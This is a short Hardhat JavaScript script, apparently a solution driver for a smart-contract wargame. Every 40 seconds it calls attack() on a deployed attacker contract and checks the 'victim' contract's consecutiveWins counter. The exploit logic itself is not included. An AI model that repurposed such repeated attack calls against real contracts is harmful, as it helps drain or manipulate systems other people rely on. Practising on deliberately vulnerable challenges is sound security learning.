const { ethers } = require("hardhat");
console.clear();
const abi = new ethers.utils.Interface(["function attack() public"]);
const abi2 = new ethers.utils.Interface([
  "function consecutiveWins() external view returns (uint)",
]);
async function main() {
  const address = "0xd7f9eE6f81DFBB86Ad80454beC7bC5503C29B5BA";
  const contractInstance = await ethers.getContractAt(abi, address);
  const victim = await ethers.getContractAt(
    abi2,
    "0x5c3A5a9094FbEd82C81A40b768d6587a7c42bfab"
  );
  const call = await contractInstance.attack();
  await call.wait();
  console.log("Call complete, ", call.hash);
  const status = await victim.consecutiveWins();
  console.log("Status is, ", status);
}
// main()
//   .then(() => process.exit(0))
//   .catch((error) => {
//     console.error(error);
//     process.exit(1);
//   });

setInterval(() => {
  main().catch((error) => {
    console.error(error);
    process.exit(1);
  });
}, 40000);
